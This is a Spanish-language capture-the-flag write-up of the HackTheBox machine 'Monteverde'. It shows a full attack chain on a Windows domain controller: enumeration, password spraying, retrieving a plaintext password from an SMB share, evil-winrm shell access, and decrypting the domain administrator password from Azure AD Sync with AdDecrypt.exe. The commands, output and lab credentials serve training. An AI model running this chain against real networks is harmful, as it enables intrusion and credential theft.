---
title: Monteverde
description: "Máquina Monteverde de Hackthebox"
date: 2024-08-23 16:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Windows
tags:
  - RPC Enumeration
  - Ldap Enumeration
  - Credential Brute Force
  - Shell Over WinRM
  - Abusing Azure Admins Group
image:
  path: /assets/img/Monteverde/Monteverde.png
---

## Skills

- RPC Enumeration
- Ldap Enumeration
- Credential Brute Force - Netexec
- Shell Over WinRM
- Abusing Azure Admins Group - Obtaining the administrator's password (Privilege Escalation)

## Certificaciones

- OSCP
- OSEP
- eCPPTv3

## Descripción

`Monteverde` es una máquina `medium windows`, enumeramos `LDAP` y `RPC` obteniendo un `listado` de `usuarios`, a través de un `ataque` de `password spraying`, se descubre que la cuenta `SABatchJobs` tiene como `contraseña` el mismo `nombre` de `usuario`. Usando esta cuenta, es posible `enumerar` los recursos compartidos `SMB` en el sistema, y se encuentra que el recurso compartido `$users` es de lectura pública. Se halla un archivo `XML` utilizado para una `cuenta` de `Azure AD` dentro de una `carpeta` de `usuario` y `contiene` una `contraseña`. Debido a que se `reutilizan contraseñas`, es posible `conectarse` al `controlador` de `dominio` como `mhope` usando `WinRM`. La enumeración muestra que `Azure AD Connect` está instalado, por lo que es posible `extraer` las `credenciales` de la `cuenta` que `replica` los `cambios` del `directorio a Azure`, en este caso del `administrador` del `dominio`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `windows` suele ser `128`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.228.111
PING 10.129.228.111 (10.129.228.111) 56(84) bytes of data.
64 bytes from 10.129.228.111: icmp_seq=1 ttl=127 time=54.7 ms
64 bytes from 10.129.228.111: icmp_seq=2 ttl=127 time=54.4 ms
64 bytes from 10.129.228.111: icmp_seq=3 ttl=127 time=54.8 ms
^C
--- 10.129.228.111 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 54.386/54.624/54.758/0.168 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`

```
# sudo nmap -p- --open --min-rate 5000 -sS -Pn -n -v 10.129.228.111 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 12:57 CEST
Initiating SYN Stealth Scan at 12:57
Scanning 10.129.228.111 [65535 ports]
Discovered open port 445/tcp on 10.129.228.111
Discovered open port 53/tcp on 10.129.228.111
Discovered open port 139/tcp on 10.129.228.111
Discovered open port 135/tcp on 10.129.228.111
Discovered open port 636/tcp on 10.129.228.111
Discovered open port 464/tcp on 10.129.228.111
Discovered open port 49693/tcp on 10.129.228.111
Discovered open port 389/tcp on 10.129.228.111
Discovered open port 49676/tcp on 10.129.228.111
Discovered open port 49673/tcp on 10.129.228.111
Discovered open port 5985/tcp on 10.129.228.111
Discovered open port 593/tcp on 10.129.228.111
Discovered open port 49674/tcp on 10.129.228.111
Discovered open port 3268/tcp on 10.129.228.111
Discovered open port 49746/tcp on 10.129.228.111
Discovered open port 9389/tcp on 10.129.228.111
Discovered open port 49668/tcp on 10.129.228.111
Discovered open port 88/tcp on 10.129.228.111
Discovered open port 3269/tcp on 10.129.228.111
Completed SYN Stealth Scan at 12:57, 39.65s elapsed (65535 total ports)
Nmap scan report for 10.129.228.111
Host is up (0.073s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49693/tcp open  unknown
49746/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.73 seconds
           Raw packets sent: 196593 (8.650MB) | Rcvd: 45 (1.980KB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49693,49746 10.129.228.111 -Pn -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 13:09 CEST
Nmap scan report for 10.129.228.111
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-23 11:09:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49746/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-23T11:10:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.18 seconds
```

### RPC Enumeration

`Enumeramos usuarios` del `dominio` con la herramienta de [https://github.com/rubenza02/rpcenumeration](https://github.com/rubenza02/rpcenumeration) y `guardamos` el `listado` de `usuarios` en un archivo

```
# rpcenumeration -s 10.129.228.111 -n -f enum_users
Enumerando usuarios en el servidor 10.129.228.111...
Usuario              RID       
------               ---       
Guest             0x1f5  
AAD_987d7f2f57d2  0x450  
mhope             0x641  
SABatchJobs       0xa2a  
svc-ata           0xa2b  
svc-bexec         0xa2c  
svc-netapp        0xa2d  
dgalanos          0xa35  
roleary           0xa36  
smorgan           0xa37  
```

### LDAP Enumeration

`Enumeramos` los `contextos` de `nombre` de `DNS` del `directorio activo`

```
# ldapsearch -x -H ldap://10.129.228.111 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`Agregamos` el `dominio` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.228.111  megabank.local

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`Obtenemos` toda la `información` disponible del `dominio` y `filtramos` por los `usuarios` que tiene un directorio home en la máquina

```
# ldapsearch -x -H ldap://10.129.228.111 -b 'DC=MEGABANK,DC=LOCAL' | grep homeDirectory                      
homeDirectory: \\monteverde\users$\mhope
homeDirectory: \\monteverde\users$\dgalanos
homeDirectory: \\monteverde\users$\roleary
homeDirectory: \\monteverde\users$\smorgan
```

`Incorporamos` estos `usuarios` al `listado` de `usuarios` que teníamos anteriormente

```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
mhope
dgalanos
roleary
smorgan
```

### SMB Enumeration

`Obtenemos` el `nombre` de la `máquina` y el `dominio`

```
# netexec smb 10.129.228.111                                                                                                            
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

`Hacemos` un `password spraying` para ver si algún usuario tiene como `contraseña` la `misma` que su `nombre` y `obtenemos` unas `credenciales`

```
# netexec smb 10.129.228.111 -u users -p users --continue-on-success | grep -v "STATUS_LOGON_FAILURE"

SMB                      10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB                      10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

`Listamos` los `recursos` compartidos

```
# netexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ           
```

Nos `conectamos` por `smb` y nos `descargamos` el archivo `azure.xml`

```
# smbclient -U 'SABatchJobs%SABatchJobs' //10.129.228.111/users$       
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
smb: \mhope\> exit
```

El `archivo` está en `UTF-16` por lo que `no` es `legible`

```
# file azure.xml 
azure.xml: Unicode text, UTF-16, little-endian text, with CRLF line terminators
```

`Convertimos` el `archivo` de `UTF-16` a `UTF-8` para que sea `legible`

```
# iconv -f UTF-16 -t UTF-8 azure.xml -o output.xml
```

Ahora podemos `visualizar` el `archivo` correctamente

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

`Validamos usuarios` con este `contraseña` y `obtenemos` unas `credenciales` válidas

```
# netexec winrm 10.129.228.111 -u users -p '4n0therD4y@n0th3r$'         
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\administrator:4n0therD4y@n0th3r$
WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$
WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

## Intrusión

`Accedemos` a la `máquina víctima` mediante el servicio `winrm`

```
# evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'      
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
```

## Privilege Escalation

`Listamos` toda la `información` del `usuario` y vemos que el usuario `pertenece` al grupo `Azure Admins`

```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`Listamos` la `información` del directorio `Program Files`

```
*Evil-WinRM* PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
d-----         1/3/2020   5:28 AM                PackageManagement
d-----         1/2/2020   9:37 PM                VMware
d-r---         1/2/2020   2:46 PM                Windows Defender
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----         1/2/2020   2:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----         1/2/2020   2:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

Si hacemos la búsqueda de `Microsoft Azure AD Sync exploit` en `google` nos encontramos con [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), donde se explica como `escalar privilegios`. Lo primero es `descargar` los `archivos` [https://github.com/VbScrub/AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) y posteriormente `subirlos` a la `máquina víctima` con `evil-winrm`, para ello deben estar en el `mismo directorio` desde el cual nos `conectamos`

```
*Evil-WinRM* PS C:\Users\mhope\Documents> upload AdDecrypt.exe
                                        
Info: Uploading /home/justice-reaper/Downloads/AdDecrypt.exe to C:\Users\mhope\Documents\AdDecrypt.exe
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> upload mcrypt.dll
                                        
Info: Uploading /home/justice-reaper/Downloads/mcrypt.dll to C:\Users\mhope\Documents\mcrypt.dll
                                        
Info: Upload successful!
```

`Ejecutamos` el `binario` y `obtenemos` las `credenciales` del usuario `administrador`, para que funcione debemos estar dentro del directorio `C:\Program Files\Microsoft Azure AD Sync\Bin`

```
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

Nos `conectamos` a la `máquina víctima` como el usuario `Administrator`

```
# evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'   
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```
